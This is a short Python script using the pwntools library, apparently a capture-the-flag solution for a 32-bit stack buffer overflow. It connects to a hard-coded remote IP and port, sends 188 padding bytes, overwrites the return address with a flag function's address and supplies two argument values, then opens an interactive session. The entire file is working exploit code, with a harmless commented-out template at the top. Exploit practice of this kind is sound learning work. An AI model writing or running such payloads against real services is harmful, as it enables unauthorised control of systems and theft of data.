from pwn import *
import os

'''
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


#gdbscript = '''
#init-pwndbg
#continue
'''.format(**locals())
exe = './vuln'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
'''

os.system('clear')

context.log_level = 'debug'

sh = remote('157.245.35.145', 32410)
flagAddr = 134517218 # 0x80491e2
param1 = 3735928559 # 0xdeadbeef
param2 = 3235827725 # 0xc0ded00d
p = b'A' * 188 
p += p32(flagAddr)
p += p32(134517425) #0x80492b1 
p += p32(param1)
p += p32(param2)
sh.recvuntil("\n")
sh.sendline(p)

sh.interactive()
